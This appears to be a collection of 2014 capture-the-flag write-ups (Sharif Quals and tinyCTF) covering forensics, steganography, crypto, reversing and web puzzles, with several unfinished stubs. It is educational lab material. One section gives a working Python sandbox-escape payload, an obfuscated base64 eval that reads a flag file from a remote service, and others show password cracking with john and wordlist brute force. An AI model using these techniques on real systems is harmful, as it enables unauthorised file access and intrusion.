* [Scoreboard](http://ctf.sharif.edu/2014/quals/su-ctf/scoreboard/) or [local alternative](scoreboard.txt)

## Completed write-ups

* [avatar](avatar)
* [birthday\_of\_websites\_admin](birthday_of_websites_admin)
* [commercial\_application](commercial_application)
* [decrypt\_the\_message](decrypt_the_message)
* [guess\_the\_number](guess_the_number)
* [hear\_with\_your_eyes](hear_with_your_eyes)
* [hidden\_message](hidden_message)
* [huge\_key](huge_key)
* [recover\_deleted\_file](recover_deleted_file)
* [rolling\_hash](rolling_hash)
* [sudoku\_image\_encryption](sudoku_image_encryption)
* [what\_is\_this](what_is_this)

## External write-ups only

* [2048](2048)
* [a\_trip\_to\_sao\_paulo](a_trip_to_sao_paulo)
* [aes\_broken](aes_broken)
* [capture\_the\_spoon](capture_the_spoon)
* [hooked\_api](hooked_api)
* [iran\_pro\_league](iran_pro_league)
* [network\_traffic](network_traffic)
* [old\_flag](old_flag)
* [our\_bank\_is\_yours](our_bank_is_yours)
* [personalized\_captcha](personalized_captcha)
* [pwn\_it](pwn_it)
* [reverse\_me](reverse_me)
* [secure\_coding](secure_coding)
* [terminate\_me](terminate_me)

## Missing write-ups

* [cafe-1](cafe-1)
* [cafe-2](cafe-2)
* [cafe-3](cafe-3)
* [cafe-4](cafe-4)
* [mining\_your\_rs\_and\_ss](mining_your_rs_and_ss)
* [touran\_city-1](touran_city-1)
* [touran\_city-2](touran_city-2)
* [touran\_city-3](touran_city-3)
* [touran\_city-4](touran_city-4)
# Sharif University Quals CTF 2014: Recover Deleted File

**Category:** Forensics
**Points:** 40
**Solves** 216
**Description:**

> Recover the disk and find the flag.
>
> [Download](disk-image.gz)

## Write-up

First, we extract the given `gzip` compressed file using `gunzip disk-image.gz`, then we find out what type of file the resulting file is:

```bash
$ file disk-image
disk-image: Linux rev 1.0 ext3 filesystem data
```

Using `binwalk`, we see that it contains an ELF that might be interesting:

```bash
$ binwalk disk-image
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Linux EXT filesystem, rev 1.0 ext3 filesystem data, UUID=bc6c2b24-106a-4570-bc4f-ae09abbdabbd
65536         0x10000         Linux EXT filesystem, rev 1.0 ext3 filesystem data, UUID=bc6c2b24-106a-4570-bc4f-ae09abbdabbd
72704         0x11C00         Linux EXT filesystem, rev 1.0 ext3 filesystem data, UUID=bc6c2b24-106a-4570-bc4f-ae09abbdabbd
1113088       0x10FC00        ELF 64-bit LSB executable, AMD x86-64, version 1 (SYSV)
1116896       0x110AE0        LZMA compressed data, properties: 0x89, dictionary size: 16777216 bytes, uncompressed size: 100663296 bytes
1117024       0x110B60        LZMA compressed data, properties: 0x9A, dictionary size: 16777216 bytes, uncompressed size: 100663296 bytes
1117216       0x110C20        LZMA compressed data, properties: 0xB6, dictionary size: 16777216 bytes, uncompressed size: 33554432 bytes
1117408       0x110CE0        LZMA compressed data, properties: 0xD8, dictionary size: 16777216 bytes, uncompressed size: 50331648 bytes
```

So we write our own [scalpel config file](scalpel.conf) and extract the elf using `scalpel`:

```bash
$ scalpel -c scalpel.conf disk-image
[...]
$ tree scalpel-output
scalpel-output/
├── audit.txt
└── elf-0-0
    └── 00000000.elf

    1 directory, 2 files
```

So what does this executable do? Let's find out:

```bash
$ chmod u+x ./scalpel-output/elf-0-0/00000000.elf && ./scalpel-output/elf-0-0/00000000.elf
your flag is:
de6838252f95d3b9e803b28df33b4baa
```

Looks like our flag is `de6838252f95d3b9e803b28df33b4baa`.

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/15/>
# Sharif University Quals CTF 2014: Reverse Me

**Category:** Reverse
**Points:** 200
**Solves** 89
**Description:**

> Reverse me and find a valid serial number!
>
> flag : [A valid serial number]
>
> [Download](ReverseMe.exe)

## Write-up

(TODO)

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/27/>
# Sharif University Quals CTF 2014: Rolling Hash

**Category:** Cryptography
**Points:** 30
**Solves** 212
**Description:**

>
>```python
>flag="*********"
>def RabinKarpRollingHash( str, a, n ):
>	result = 0
>	l = len(str)
>	for i in range(0, l):
>		result += ord(str[i]) * a ** (l - i - 1) % n
>	print "result = ", result
>
>RabinKarpRollingHash(flag, 256, 10**30)
>```
> output is 
> 1317748575983887541099 
> What is the flag?

## Write-up

The flag variable suggests that the flag is of length 9, the biggest decimal value a single character can have is `127`.
Combining both, we see that `result` can has at maximum `127\*256\*\*8`, which is `2.3427365e+21`. As we see, the modulu by n, a 31 digit number, does not have any effect, so we can leave that part out.

We just have to reverse the encryption process by dividing the given `result` by the relative multiplication of `a`. The rest is used in the further computation of each following letter. See the [decryption and encryption code](code.py).
## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/13/>
# Sharif University Quals CTF 2014: Secure Coding

**Category:** Secure-Coding
**Points:** 100 | 200 | 300
**Solves** 117 | 37 | 7
**Description:**

> <http://ctf.sharif.edu:53840>

## Write-up

(TODO)

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/23/>
* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/28/>
* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/35/>
# Sharif University Quals CTF 2014: Sudoku Image Encryption

**Category:** Cryptography
**Points:** 40
**Solves** 169
**Description:**

> Row Major Order
>
> [Download](row-major-order.tar.gz)

## Write-up

We are given two images:

![](image.png)
![](sudoku.png)

Noticing the title "Row Major Order" and having a sudoku to solve, we come to the conclusion that we have to rearrange the picture fragments (of size `50x50` pixels) by row given the [solution](solution) of the sudoku.

The following [script](defrag) just does this:

```
#!/bin/bash
mkdir in out result
for i in {1..9}; do
	for j in {1..9}; do convert -extract 50x50+$(($((j-1))*50))+$(($((i-1))*50)) image.png in/a$i-$j.png; done
	COUNT=1
	sed "${i}q;d" solution | grep --color=none -o . | while read n; do
		cp in/a$i-$COUNT.png out/a$i-$n.png; COUNT=$((COUNT+1))
	done
	convert +append out/a$i-{1..9}.png result/out$i.png
done

for i in {1..9}; do convert -append result/out{1..9}.png flag.png; done
```

The resulting `flag.png`:

![](flag.png)

Success! Our flag is `d41d8cd98f00b204e9800998ecf8427e3`.
## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/16/>
# Sharif University Quals CTF 2014: Terminate Me

**Category:** Reverse, Forensics
**Points:** 450
**Solves** 1
**Description:**

> Terminate me and unload the driver to get the flag! 
> Flag : string in theFlag.txt file! 
> Notes: 
> 1- use windows 7/8 64 bit 
> 2- turn off your antivirus
>
> [Download](TerminateMe.exe)

## Write-up

(TODO)

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/37/>
# Sharif University Quals CTF 2014: Tourcan City-1

**Category:** Recon
**Points:** 150
**Solves** 48
**Description:**

> Due to economic downturns and lack of resources, Monsters Inc. has decided to scare kids regularly door to door, instead of using their teleport technology. Their office in Touran City has developed an Android app, which is used by the head office to communicate with the monsters (i.e. transmit new assignments to them). Recently, the Touran City Police Department (TCPD) tracked and captured a thief and found a cell phone on him. It seems that the thief had stolen the cell phone from one of the Monsters Inc. employees. A backup of the cell phone is attached.
>
> Can you find out whose phone is this?
>
>
> Flag: Full Name of the Monster
> [Download](phone-backup)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Sharif University Quals CTF 2014: Touran City-2

**Category:** Recon
**Points:** 250
**Solves** 4
**Description:**

> Touran city is nicely organized (download the map below). All streets are either horizontal or vertical and homes are packed in 2x2 blocks. The bottom-left corner of the city is located at 55.6790078, 34.4017202! People of Touran use a simple and straight forward addressing scheme. In the city, the horizontal streets (each having a width of 20 meters) are numbered from 1 to 51 starting from the bottom to the top of the map. The lowest street, which does not have any home at the south, is street number 1. Buildings in each row, where each occupy a 30x30 meter area, are numbered from 1 to 100, left to right. Each building is addressed based on three parameters: the street number, the direction (S for the South and N for the North of street) and building number. For example a sample home, which is indicated by color red in the attached map, is located at 16-N-5, which means the 16th street from bottom, 5th home from left, at the North of the street!
>
> Now, what is the Monsters Inc. office address?
>
> Flag: the address
>
> [Download](map.svg.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Sharif University Quals CTF 2014: Touran City-3

**Category:** Recon
**Points:** 250
**Solves** 4
**Description:**

> Would you please help us find the thief's home address?
>
>
> Flag: the address (use the addressing scheme from the Touran City-2 challenge)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Sharif University Quals CTF 2014: Touran City-4

**Category:** Recon
**Points:** 350 + 17.5
**Solves** 2
**Description:**

> Can you find out the exact time the phone was stolen?
>
> Flag: The exact time, in the format: yyyy.MM.dd-HH:mm:ss

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Sharif University Quals CTF 2014: What is this

**Category:** Steganography
**Points:** 20
**Solves** 308
**Description:**

> Find the flag!
>
> [Download](what-is-this.tar.gz)

## Write-up

We are given two pictures:

![](pic1.jpg)
![](pic2.jpg)

Using a stegonagraphy tool like [stegsolve](http://www.wechall.net/forum/show/thread/527/Stegsolve\_1.3/page-1), we combine both pictures by XORing them. The result is this picture, containing the `AZADI TOWER` flag:

![](azaditower.png)

## Other write-ups and resources

* <http://ctf.sharif.edu/2014/quals/su-ctf/write-ups/11/>
# tinyCTF 2014: CAN HAS STDIO?

**Category:** Miscellaneous
**Points:** 50
**Description:**

> [Download file](misc50.zip)

## Write-up

Let’s unzip the provided `misc50.zip` file:

```bash
$ unzip misc50.zip
Archive:  misc50.zip
  inflating: misc50
```

The extracted `misc50` file is a [brainfuck](https://en.wikipedia.org/wiki/Brainfuck) program. When executed, it prints the flag:

```
flag{esolangs_for_fun_and_profit}
```

## Other write-ups and resources

* <https://github.com/evanowe/TinyCTF2014-writeups/blob/master/README.md#can-has-stdio>
* <https://github.com/jesstess/tinyctf/blob/master/stdio/stdio.md>
* <http://barrebas.github.io/blog/2014/10/03/tinyctf/>
# tinyCTF 2014: ECB, it’s easy as 123

**Category:** Crypto
**Points:** 300
**Description:**

> [Download file](cry300.zip)

## Write-up

Let’s extract the provided `cry300.zip` file:

```bash
$ unzip cry300.zip
Archive:  cry300.zip
  inflating: cry300
```

The extracted `cry300` file is another ZIP archive:

```bash
$ file cry300
cry300: Zip archive data, at least v2.0 to extract
```

So let’s unzip it as well:

```bash
$ unzip cry300
Archive:  cry300
  inflating: ecb.bmp
  inflating: task.txt
```

The extracted `task.txt` file says:

> Somebody leaked a still from the upcoming Happy Feet Three movie,
> which will be released in 4K, but Warner Bros. was smart enough
> to encrypt it. But those idiots used a black and white bmp format,
> and that wasn't their biggest mistake. Show 'em who's boss and
> get the flag.

The BMP file is not actually a valid image file because it is encrypted. Its first few bytes are interesting:

```bash
$ hexdump -C ecb.bmp | head -n2
53 61 6c 74 65 64 5f 5f  ab 31 b5 e5 ca 3d b9 4d  |Salted__.1...=.M|
```

The `Salted__` prefix indicates this file is [encrypted using OpenSSL](http://justsolve.archiveteam.org/wiki/OpenSSL_salted_format). The next 8 bytes (`ab 31 b5 e5 ca 3d b9 4d`) are the salt that was used to encrypt the file. The rest of the file is the encrypted data.

There are a few hints in the title and the task description:

* ECB – ECB encryption is notoriously bad for images because the same plaintext block results in the same ciphertext
* 4K resolution – this tells us the image is either 3840×2160 or 4096×2160 pixels
* black and white – we will most likely see a lot of white-only blocks

With this in mind, let’s take a look at the hex dump:

```bash
$ xxd ecb.bmp | head -n 13
0000000: 5361 6c74 6564 5f5f ab31 b5e5 ca3d b94d  Salted__.1...=.M
0000010: f409 1aa5 df88 b72c 0ebd 8a73 9815 ba69  .......,...s...i
0000020: a224 3e09 94cb 791e eaa1 ad33 c817 6663  .$>...y....3..fc
0000030: 7898 230b f0af 2038 f1aa 0bf4 691c eccf  x.#... 8....i...
0000040: fcd8 8e3d 452a 99b0 536b 500d 8a3d c4b7  ...=E*..SkP..=..
0000050: 629c 6a54 f059 2013 224f b6e2 b6aa 0a8b  b.jT.Y ."O......
0000060: 5e21 1a9d cf8c a2f6 4580 cb9b b737 da7f  ^!......E....7..
0000070: 7350 88cb df63 ee22 d424 b3b9 f424 ad40  sP...c.".$...$.@
0000080: 2f09 e681 9bb5 1388 01fa 0a47 7809 6523  /..........Gx.e#
0000090: 323f 8b1e b820 9c99 fcb5 4601 0bc9 4134  2?... ....F...A4
00000a0: 323f 8b1e b820 9c99 fcb5 4601 0bc9 4134  2?... ....F...A4
00000b0: 323f 8b1e b820 9c99 fcb5 4601 0bc9 4134  2?... ....F...A4
00000c0: 323f 8b1e b820 9c99 fcb5 4601 0bc9 4134  2?... ....F...A4
```

Clearly those are blocks of pixels with the same color. Now we could write a script to solve this task. This script would create an image where every 16 pixel block would be black or white, depending on whether the corresponding encrypted block is the same as the most frequent block (`32 3f 8b 1e …`).

There is an even better solution though. We can simply remove the first 16 bytes (`Salted__` and the salt) and then replace the first few bytes in the ciphertext with a valid BMP header. This works because BMPs store raw data and we won’t get invalid blocks.

To get a valid BMP header for this particular image size, the easiest solution is to create a BMP. When we create a BMP with the right size, we notice a problem right away. The image size is way bigger than the payload (24 MB vs. 4 MB). After some tinkering we realize that the image had 16-bit color depth instead of 24. We also learn the correct resolution (3840×2160 instead of 4096×2160), because the sizes must match perfectly (except there is a 16-byte header and up to 16 bytes of padding at the end). Now we can do the surgery on the ciphertext with any hex editor program.

Here is the correct header that we will have to “inject”:

```bash
$ xxd sample.bmp | head -n 8
0000000: 424d 7648 3f00 0000 0000 7600 0000 2800  BMvH?.....v...(.
0000010: 0000 000f 0000 7008 0000 0100 0400 0000  ......p.........
0000020: 0000 0048 3f00 0000 0000 0000 0000 0000  ...H?...........
0000030: 0000 0000 0000 0000 0000 0000 8000 0080  ................
0000040: 0000 0080 8000 8000 0000 8000 8000 8080  ................
0000050: 0000 8080 8000 c0c0 c000 0000 ff00 00ff  ................
0000060: 0000 00ff ff00 ff00 0000 ff00 ff00 ffff  ................
0000070: 0000 ffff ff00 ffff ffff ffff ffff ffff  ................
```

After the surgery, the resulting bitmap is more-or-less readable (converted to PNG and resized to take up less space):

![](solution.png)

The flag is `flag{no_penguin_here}`.

## Other write-ups and resources

* <https://github.com/jesstess/tinyctf/blob/master/ecb/ecb.md>
* <http://barrebas.github.io/blog/2014/10/03/tinyctf/>
# tinyCTF 2014: Elrond32

**Category:** Reverse Engineering
**Points:** 300
**Description:**

> [Download file](rev300.zip)

## Write-up

Let’s extract the provided `rev300.zip` file:

```bash
$ unzip rev300.zip
Archive:  rev300.zip
  inflating: rev300
```

The extracted `rev300` file is an ELF binary:

```bash
$ file rev300
rev300: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
```

We open it in IDA. As usual, the `main` function is the first argument to `___libc_start_main`. Its functionality is simple: if `argv[1]` is present it calls `check_password(argv[1], 0)`. If this check succeeds it calls `print_flag(argv[1])`. Since `print_flag` depends on `argv[1]` we must first reverse `check_password`.

Rename the arguments to get `check_password(password, pos)`. At the beginning of the function it uses a jump table based on `pos`, meaning in the original code a switch statement was used. We have to manually tell IDA this. Go to the `jump eax` instruction, then _Edit_ → _Other_ → _Specify Switch Idiom_. The jump table has 10 elements, each a pointer of size 4 bytes. The default case is located at `0x80484D5`. We end up with a nice layout after this:

![Jump table](jump-table.png)

Inspecting the function now reveals that in each call the first character is checked (in one of the switch cases). If this character is correct, it recursively calls `check_password(password + 1, newpos)`. Once `pos` equals `2` or `9`, the `default` switch case is hit, which returns `true` (i.e. the password is correct). The final difficulty is finding out how `newpos` is calculated in the recursive call [1]. A commented version is shown in the following image:

![Calculation of newpos](newpos.png)

The magic constant `0x2E8BA2E9` is used to perform an optimized division by `11`. This optimization technique replaces a constant division by a [multiplication of its reciprocal in fixed-point notation](http://ridiculousfish.com/blog/posts/labor-of-division-episode-i.html). One trick to find out the denominator is to divide `2^32` by the magic constant, and multiply this to match any shift operation like `sar edx, 1`. In this case we have `2^32 / 0x2E8BA2E9 * 2` which equals `1`1. The other arithmetic operations are straightforward. So the value of the new `pos` is (keep in mind that all intermediate results are rounded down):

```c
newpos = (pos + 1) * 7 - [(pos + 1) * 7 / 11 * 11]
```

This is equivalent with:

```c
temp = (pos + 1) * 7
help = temp - (temp % 11)
newpos = temp - help
```

Which can be simplified to:

```c
newpos = temp - help
       = temp - temp + (temp % 11)
       = temp % 11
       = [(pos + 1) * 7] % 11
```

Since the first value of `pos` is `0`, the subsequent values are `7`, `1`, `3`, `6`, `5`, `9`, `4`, and finally `2` (which results in a `default` switch case). Recall that in each of the resulting switch cases, the first character is checked. Hence the password must be `isengard`. This prints out the flag:

```
flag{s0me7hing_S0me7hinG_t0lki3n}
```

[1] Here I decided to explain how to reverse this calculation, since I think this is useful to know. Another approach is to simply step through the execution using a debugger, and dynamically observe which characters are compared to what. This can even be scripted in `gdb`.

### Alternate solution

Using the hint of Elrond, @MajorD4m4ge downloaded a Tolkien dictionary from <http://packetstorm.igor.onlinedirect.bg/Crackers/wordlists/literature/tolkien.gz> and ran:

```bash
$ zcat tolkien.gz | while read line; do ./rev300 "$line"; done | grep -v denied
Access granted
flag{s0me7hing_S0me7hinG_t0lki3n}
```

Running it on `rockyou.txt.gz` eventually revealed the flag as well.

## Other write-ups and resources

* <https://github.com/jesstess/tinyctf/blob/master/elrond32/elrond32.md>
* <http://barrebas.github.io/blog/2014/10/03/tinyctf/>
# tinyCTF 2014: Erik, Baleog and Olaf

**Category:** Steganography
**Points:** 100
**Description:**

> [Download file](stego100.zip)

## Write-up

Let’s extract the provided `stego100.zip` file:

```bash
$ unzip stego100.zip
Archive:  stego100.zip
  inflating: stego100
```

The extracted `stego100` file is a PNG image:

```bash
$ file stego100
stego100: PNG image data, 640 x 480, 8-bit/color RGB, non-interlaced
```

Let’s run `pngcheck` on it:

```bash
$ pngcheck -f -v -7 stego100.png
File: stego100.png (26857 bytes)
  chunk IHDR at offset 0x0000c, length 13
    640 x 480 image, 24-bit RGB, non-interlaced
  chunk IDAT at offset 0x00025, length 26753
    zlib: deflated, 32K window, maximum compression
  chunk tEXt at offset 0x068b2, length 35, keyword: hint
    http://i.imgur.com/22kUrzm.png
  chunk IEND at offset 0x068e1, length 0
No errors detected in stego100.png (4 chunks, 97.1% compression).
```

[That hint URL](https://i.imgur.com/22kUrzm.png) is [another image](hint.png) that looks the same:

![](hint.png)

Let’s diff it with the original `stego100.png` image using [ImageMagick’s `compare` command](http://www.imagemagick.org/script/compare.php):

```bash
$ compare hint.png stego100.png -compose src diff.png
```

[`diff.png`](diff.png) reveals a QR code:

![](diff.png)

Decoding the QR code gives `flag{#justdiffit}`, which is the flag.

## Other write-ups and resources

* <http://sugarstack.io/tinyctf-steg-100.html>
* <https://poerhiza.github.io/ctf/2014/10/05/tinyCTF-write_ups-erik_baleog_and_olaf/>
* <https://github.com/evanowe/TinyCTF2014-writeups/blob/master/README.md#erik-baleog-and-olaf>
* <https://github.com/jesstess/tinyctf/blob/master/erik/erik.md>
* <http://barrebas.github.io/blog/2014/10/03/tinyctf/>
# tinyCTF 2014: János the Ripper

**Category:** Miscellaneous
**Points:** 100
**Description:**

> [Download file](misc100.zip)

## Write-up

Let’s extract the provided `misc100.zip` file:

```bash
$ unzip misc100.zip
Archive:  misc100.zip
  inflating: misc100
```

The extracted `misc100` file is another ZIP archive:

```bash
$ file misc100
misc100: Zip archive data, at least v2.0 to extract
```

Let’s try to unzip it:

```bash
$ unzip misc100
Archive:  misc100
[misc100] flag.txt password:
password incorrect--reenter:
   skipping: flag.txt                incorrect password
```

Oh, it’s password-protected! Let’s crack the password usig `fcrackzip` or, as the challenge name suggests, `john`:

```bash
$ zip2john misc100 > zip-hashes
/tmp/misc100->flag.txt PKZIP Encr: cmplen=39, decmplen=25, crc=7788D444

$ cat zip-hashes
/tmp/misc100:$pkzip$1*1*2*0*27*19*7788d444*0*26*8*27*7788*0010014b93ff03ee9cfad31283a15788578cbf41aa418716f685fe4002da73ca1fac169789443a*$/pkzip$

$ john zip-hashes --show
/tmp/misc100:fish

1 password hash cracked, 0 left
```

A-ha! The ZIP password is `fish`. Now we can unzip the archive:

```bash
$ unzip -P 'fish' misc100
Archive:  misc100
  inflating: flag.txt
```

The extracted `flag.txt` file contains the flag:

```
flag{ev3n::y0u::bru7us?!}
```

## Other write-ups and resources

* <http://sugarstack.io/tinyctf-misc-100.html>
* <https://github.com/evanowe/TinyCTF2014-writeups/blob/master/README.md#j%C3%A1nos-the-ripper>
* <https://github.com/jesstess/tinyctf/blob/master/janos/janos.md>
* <http://barrebas.github.io/blog/2014/10/03/tinyctf/>
# tinyCTF 2014: NaNNaNNaNNaN…, Batman!

**Category:** Web
**Points:** 100
**Description:**

> [Download file](web100.zip)

## Write-up

Let’s unzip [the provided `web100.zip` file](web100.zip):

```bash
$ unzip web100.zip
Archive:  web100.zip
  inflating: web100
```

The extracted `web100` file is an HTML document that contains a script. The script is obfuscated and contains control characters. Here’s a (believe it or not) cleaned up version:

```js
_ = 'function $(){\x02e=\x04getEle\x0FById("c").value;\x0Elength==16\x05^be0f23\x01233ac\x01e98aa$\x01c7be9\x07){\x02t\bfl\x03s_a\x03i\x03e}\x06n\ba\x03_h0l\x03n\x06r\bg{\x03e\x03_0\x06i\bit\'\x03_\x03n\x06s=[t,n,r,i];for(\x02o=0;o<13;++o){\t\x0B[0]);\x0B.splice(0,1)}}}\t\'<input id="c"><\f onclick=$()>Ok</\f>\');delete _\x01\x07\x05\x02var \x03","\x04docu\x0F.\x05)\x0Ematch(/\x06"];\x02\x07/)!=null\b=["\t\x04write(\x0Bs[o%4]\fbutton\x0Eif(e.\x0Fment';
for (Y in $ = '\x0F\x0E\f\x0B\t\b\x07\x06\x05\x04\x03\x02\x01')
  with (_.split($[Y]))
    _ = join(pop());
eval(_);
```

To see what code gets evaluated, let’s replace the `eval` at the end with `console.log`. This results in:

```js
function $(){var e=document.getElementById("c").value;if(e.length==16)if(e.match(/^be0f23/)!=null)if(e.match(/233ac/)!=null)if(e.match(/e98aa$/)!=null)if(e.match(/c7be9/)!=null){var t=["fl","s_a","i","e}"];var n=["a","_h0l","n"];var r=["g{","e","_0"];var i=["it'","_","n"];var s=[t,n,r,i];for(var o=0;o<13;++o){document.write(s[o%4][0]);s[o%4].splice(0,1)}}}document.write('<input id="c"><button onclick=$()>Ok</button>');delete _
```

This beautifies into:

```js
function $() {
  var e = document.getElementById('c').value;
  if (e.length == 16) {
    if (e.match(/^be0f23/) != null) {
      if (e.match(/233ac/) != null) {
        if (e.match(/e98aa$/) != null) {
          if (e.match(/c7be9/) != null) {
            var t = ['fl', 's_a', 'i', 'e}'];
            var n = ['a', '_h0l', 'n'];
            var r = ['g{', 'e', '_0'];
            var i = ['it\'', '_', 'n'];
            var s = [t, n, r, i];
            for (var o = 0; o < 13; ++o) {
              document.write(s[o % 4][0]);
              s[o % 4].splice(0, 1);
            }
          }
        }
      }
    }
  }
}
document.write('<input id="c"><button onclick=$()>Ok</button>');
delete _;
```

From this code, we can tell we’re supposed to enter a value into a text field. If this value matches certain conditions, another value (possibly the flag) will be printed. Here’s what we know about the expected input:

* it contains exactly 16 characters (`e.length == 16`)
* it starts with `be0f23` (`e.match(/^be0f23/) != null`)
* it ends with `e98aa` (`e.match(/e98aa$/) != null`)
* it contains `233ac` (`e.match(/233ac/) != null`)
* it contains `c7be9` (`e.match(/e98aa$/) != null`)

There’s only one string that satisfies all these requirements: `be0f233ac7be98aa`.

Entering it reveals the flag:

```
flag{it's_a_h0le_in_0ne}
```

### Alternate solution

Since the code that is executed once the correct value is entered doesn’t depend on the actual input, you could just run it directly:

```js
var t = ['fl', 's_a', 'i', 'e}'];
var n = ['a', '_h0l', 'n'];
var r = ['g{', 'e', '_0'];
var i = ['it\'', '_', 'n'];
var s = [t, n, r, i];
for (var o = 0; o < 13; ++o) {
  document.write(s[o % 4][0]);
  s[o % 4].splice(0, 1);
}
```

This prints the flag.

## Other write-ups and resources

* <https://github.com/jesstess/tinyctf/blob/master/batman/batman.md>
* <http://barrebas.github.io/blog/2014/10/03/tinyctf/.
# tinyCTF 2014: Not exactly Alcatraz

**Category:** Exploitable
**Points:** 200
**Description:**

> [Exploit this](pwn200.zip)
> Over here: `nc 54.69.118.120 6000`
> Flag is in `/home/pybaby/flag.txt`

## Write-up

Let’s unzip [the provided `pwn200.zip` file](pwn200.zip):

```bash
$ unzip pwn200.zip
Archive:  pwn200.zip
  inflating: pwn200
```

The extracted `pwn200` file is a Python script.

```bash
$ python pwn200

Welcome to Safe Interactive CPython Shell (SICS)
================================================

Rules:
    - Wash your dishes
    - Don't eat the yellow snow
    - Do not import anything
    - No peeking at files!

baby@sics:~$
1 + 1
2
```

The script evaluates any Python code we enter, as long as it doesn’t contain the blacklisted words `import`, `open`, `flag`, `eval`, or `exec`. We need to find a way to break out of the sandbox and still read files.

The simplest solution is to use `file` instead of `open`:

```python
file('/home/pybaby/fl\x61g.txt').read()
```

Another possible solution that allows more generic code execution is the following:

```python
__builtins__.__dict__['ZXZhbA=='.decode('base64')]('b3BlbignL2hvbWUvcHliYWJ5L2ZsYWcudHh0JykucmVhZCgp'.decode('base64'))
```

`__builtins__.__dict__['ZXZhbA=='.decode('base64')]` is equivalent to `eval`, and `'b3BlbignL2hvbWUvcHliYWJ5L2ZsYWcudHh0JykucmVhZCgp'.decode('base64')` is `open('/home/pybaby/flag.txt').read()`. This prints the contents of the `/home/pybaby/flag.txt` file:

```
baby@sics:~$
__builtins__.__dict__['ZXZhbA=='.decode('base64')]('b3BlbignL2hvbWUvcHliYWJ5L2ZsYWcudHh0JykucmVhZCgp'.decode('base64'))
flag{python_sandboxing:_harder_than_teaching_your_mom_dota}

this is bad.

BitK vous fait des gros bisous

baby@sics:~$
```

The flag is `flag{python_sandboxing:_harder_than_teaching_your_mom_dota}`.

## Other write-ups and resources

* <http://sugarstack.io/tinyctf-exp-200.html>
* <https://poerhiza.github.io/ctf/2014/10/05/tinyCTF-write_ups-not_exactly_alcatraz/>
* [_Escaping Python sandboxes_](https://isisblogs.poly.edu/2012/10/26/escaping-python-sandboxes/)
* <https://github.com/evanowe/TinyCTF2014-writeups/blob/master/README.md#not-exactly-alcatraz>
* <https://github.com/jesstess/tinyctf/blob/master/alcatraz/alcatraz.md>
* <http://barrebas.github.io/blog/2014/10/03/tinyctf/>
# tinyCTF 2014: Ooooooh! What does this button do?

**Category:** Reverse Engineering
**Points:** 200
**Description:**

> [Download file](rev200.zip)

## Write-up

Let’s unzip [the provided `rev200.zip` file](rev200.zip):

```bash
$ unzip rev200.zip
Archive:  rev200.zip
  inflating: rev200
```

The extracted `rev200` file is another ZIP file:

```bash
$ unzip rev200
Archive:  rev200
  inflating: res/layout/activity_flag.xml
  inflating: res/layout/activity_main.xml
  inflating: res/menu/flag.xml
  inflating: res/menu/main.xml
  inflating: AndroidManifest.xml
  inflating: resources.arsc
  inflating: res/drawable-hdpi/ic_launcher.png
  inflating: res/drawable-mdpi/ic_launcher.png
  inflating: res/drawable-xhdpi/ic_launcher.png
  inflating: res/drawable-xxhdpi/ic_launcher.png
  inflating: classes.dex
  inflating: META-INF/MANIFEST.MF
  inflating: META-INF/CERT.SF
  inflating: META-INF/CERT.RSA
```

Well, actually, it might’ve been an Android application package file (`*.apk`).

Anyway, let’s convert the bytecode in the `classes.dex` file back to a `*.jar` file [using `dex2jar`](https://code.google.com/p/dex2jar/):

```bash
$ d2j-dex2jar classes.dex
dex2jar classes.dex -> classes-dex2jar.jar
```

Fun fact: `*.jar` files are essentially zip files too. We can just rename `classes-dex2jar.jar` to `classes-dex2jar.jar.zip` and unzip it to unpack its contents. Alternatively, this command has the same result:

```bash
$ jar xf classes-dex2jar.jar
```

In this case, the resulting source files aren’t easily readable, so let’s use a decompiler. Open `classes-dex2jar.jar` in [JD-GUI](http://jd.benow.ca/). Now we can view all the source code, or go to _File_ → _Save All Sources_ to save the sources so we can view them in our preferred text editor.

The `ctf/crackme` directory looks interesting. The `FlagActivity.java` file contains:

```java
protected void onCreate(Bundle paramBundle)
{
  super.onCreate(paramBundle);
  setContentView(2130903040);
  String str = "";
  int[] arrayOfInt = { 102, 108, 97, 103, 123, 119, 52, 110, 110, 52, 95, 106, 52, 114, 95, 109, 121, 95, 100, 51, 120, 125 };
  for (int i = 0; ; i++)
  {
    if (i >= 22)
    {
      ((TextView)findViewById(2131230721)).setText(str);
      return;
    }
    str = str.concat(String.valueOf((char)arrayOfInt[i]));
  }
}
```

The above snippet builds a string based on an array of Unicode code points. Let’s see what string it creates:

```js
$ node -e 'console.log(String.fromCharCode(102, 108, 97, 103, 123, 119, 52, 110, 110, 52, 95, 106, 52, 114, 95, 109, 121, 95, 100, 51, 120, 125));'
flag{w4nn4_j4r_my_d3x}
```

The flag is `flag{w4nn4_j4r_my_d3x}`.

## Other write-ups and resources

* <https://github.com/evanowe/TinyCTF2014-writeups/blob/master/README.md#ooooooh-what-does-this-button-do>
* <http://sugarstack.io/tinyctf-rev-200.html>
* <https://github.com/jesstess/tinyctf/blob/master/button/button.md>
* <http://barrebas.github.io/blog/2014/10/03/tinyctf/>
# tinyCTF 2014 write-ups

* <http://54.69.118.120:1337/>
* [Scoreboard](http://54.69.118.120:1337/scoreboard)
* [Flag statistics](https://gist.github.com/balidani/03279209c8b3fde0649e)
* [@tinyctf on Twitter](https://twitter.com/tinyctf)
* [The Python back-end used for this CTF](https://github.com/balidani/tinyctf-platform)

## Info

All flags have a format of `flag{%s} % (funny_key_here)`.

## Completed write-ups

* [CAN HAS STDIO?](can-has-stdio)
* [ECB, it’s easy as 123](ecb-its-easy-as-123)
* [Elrond32](elrond32)
* [Erik, Baleog and Olaf](erik-baleog-and-olaf)
